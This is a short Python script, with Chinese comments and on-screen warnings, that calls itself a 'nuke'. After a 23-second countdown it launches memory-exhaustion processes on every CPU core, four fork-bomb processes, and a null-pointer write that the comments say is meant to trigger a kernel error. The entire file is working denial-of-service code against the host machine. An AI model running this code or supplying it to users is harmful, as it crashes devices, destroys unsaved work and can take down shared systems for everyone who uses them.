import os
import multiprocessing
import ctypes
import time
print("注意你開啟了核彈")
print("你的手機/電腦可能會崩潰!")
print("如果你是誤觸在20秒內關閉這個程式!!")
time.sleep(23)
print("祝你好運")
time.sleep(0.1)
def allocate_ram():
    """持续分配内存直到OOM Killer介入"""
    chunks = []
    while True:
        chunks.append(bytearray(100 * 1024 * 1024))  # 每次分配100MB

def fork_bomb():
    """fork炸弹变种"""
    while True:
        os.fork()

def kernel_panic_trigger():
    """通过非法内存访问尝试触发内核错误"""
    ctypes.memset(0, 0, 1)  # 故意访问空指针

if __name__ == "__main__":
    # 内存攻击
    for _ in range(os.cpu_count()):
        multiprocessing.Process(target=allocate_ram).start()
    
    # 进程攻击
    for _ in range(4):
        multiprocessing.Process(target=fork_bomb).start()
    
    # 内核攻击
    multiprocessing.Process(target=kernel_panic_trigger).start()
